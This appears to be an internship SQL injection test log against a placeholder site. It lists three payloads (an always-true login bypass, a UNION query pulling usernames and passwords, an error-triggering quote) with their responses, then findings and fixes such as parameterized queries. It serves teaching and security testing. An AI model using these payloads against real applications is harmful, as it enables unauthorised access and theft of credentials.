# SQL Injection Logs

## Overview
This document contains logs related to SQL injection testing conducted during the Cybersecurity Internship Program. The logs detail the requests made, responses received, and any vulnerabilities identified.

## Test Cases

### Test Case 1: Basic SQL Injection
- **Request URL:** `http://example.com/login`
- **Payload:** `' OR '1'='1`
- **Response:** 
  - Status Code: 200
  - Response Body: "Welcome, admin!"

### Test Case 2: Union-Based SQL Injection
- **Request URL:** `http://example.com/products?id=1`
- **Payload:** `1 UNION SELECT username, password FROM users--`
- **Response:** 
  - Status Code: 200
  - Response Body: 
    ```
    id | username | password
    1  | admin    | admin123
    ```

### Test Case 3: Error-Based SQL Injection
- **Request URL:** `http://example.com/search?q=test`
- **Payload:** `test'`
- **Response:** 
  - Status Code: 500
  - Response Body: "SQL syntax error..."

## Summary of Findings
- The application is vulnerable to basic SQL injection attacks.
- Sensitive data such as usernames and passwords can be retrieved using union-based injections.
- Error messages can provide insights into the database structure.

## Recommendations
- Implement prepared statements and parameterized queries to mitigate SQL injection risks.
- Conduct regular security assessments and code reviews to identify and fix vulnerabilities.
